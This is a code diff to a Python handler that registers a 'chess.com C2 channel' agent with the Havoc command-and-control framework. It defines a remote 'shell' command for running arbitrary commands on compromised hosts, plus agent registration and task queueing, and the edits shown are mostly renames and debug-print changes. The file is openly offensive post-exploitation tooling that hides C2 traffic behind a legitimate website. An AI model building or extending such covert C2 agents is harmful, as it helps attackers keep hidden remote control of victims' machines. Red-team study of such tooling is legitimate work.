@@ -17,7 +17,7 @@ COMMAND_OUTPUT           = 0x200
 class CommandShell(Command):
     CommandId = COMMAND_SHELL
     Name = "shell"
-    Description = "executes commands using cmd.exe"
+    Description = "executes commands"
     Help = ""
     NeedAdmin = False
     Params = [
@@ -31,14 +31,14 @@ class CommandShell(Command):
 
     def job_generate( self, arguments: dict ) -> bytes:
         Task = Packer()
-
+        print("[+] CommandShell: "+str(arguments))
         Task.add_data(arguments[ 'commands' ])
         return Task.buffer
 
 class CommandExit( Command ):
     CommandId   = COMMAND_EXIT
     Name        = "exit"
-    Description = "tells the chess agent to exit"
+    Description = "tells the python agent to exit"
     Help        = ""
     NeedAdmin   = False
     Mitr        = []
@@ -55,11 +55,11 @@ class CommandExit( Command ):
 # =======================
 # ===== Agent Class =====
 # =======================
-class chess(AgentType):
-    Name = "Chess.com"
+class python(AgentType):
+    Name = "Chess"
     Author = "@OfficialScragg"
     Version = "1.0"
-    Description = f"""Chess.com C2 agent for Havoc"""
+    Description = f"""Super cool chess.com C2 channel agent."""
     MagicValue = 0x41414141
 
     Arch = [
@@ -100,43 +100,40 @@ class chess(AgentType):
     def response( self, response: dict ) -> bytes:
         agent_header    = response[ "AgentHeader" ]
 
-        print("Received request from agent"+str(response))
+        print("Receieved request from agent")
         agent_header    = response[ "AgentHeader" ]
         agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
-        print(agent_response)
+        #print(agent_response)
         agentjson = json.loads(agent_response)
-        print(agent_header)
+        #print(agent_header)
         if agentjson["task"] == "register":
-            print(json.dumps(agentjson,indent=4))
+            #print(json.dumps(agentjson,indent=4))
             print("[*] Registered agent")
             self.register( agent_header, json.loads(agentjson["data"]) )
             AgentID = response[ "AgentHeader" ]["AgentID"]
             self.console_message( AgentID, "Good", f"Python agent {AgentID} registered", "" )
             return b'registered'
         elif agentjson["task"] == "gettask":
-            print("HANDLER -> AGENT RESPONSE: " + str(response))
             AgentID = response[ "Agent" ][ "NameID" ]
-            self.console_message( AgentID, "Good", "Host checkin", "" )
-
             print("[*] Agent requested taskings")
             Tasks = self.get_task_queue( response[ "Agent" ] )
             print("Tasks retrieved")
             if len(agentjson["data"]) > 0:
-                print("Output: " + agentjson["data"])
                 self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
-            print(Tasks)
         return Tasks
 
+
+
 def main():
-    Havoc_python = chess()
+    Havoc_python = python()
     print(os.getpid())
     print( "[*] Connect to Havoc service api" )
-    Havoc_Service = HavocService(
-        endpoint="wss://localhost:40056/service-endpoint",
+    havoc_service = HavocService(
+        endpoint="wss://127.0.0.1:40056/service-endpoint",
         password="service-password"
     )
-    print( "[*] Register chess to Havoc" )
-    Havoc_Service.register_agent(Havoc_python)
+    print( "[*] Register python to Havoc" )
+    havoc_service.register_agent(Havoc_python)
     return
 
 if __name__ == '__main__':
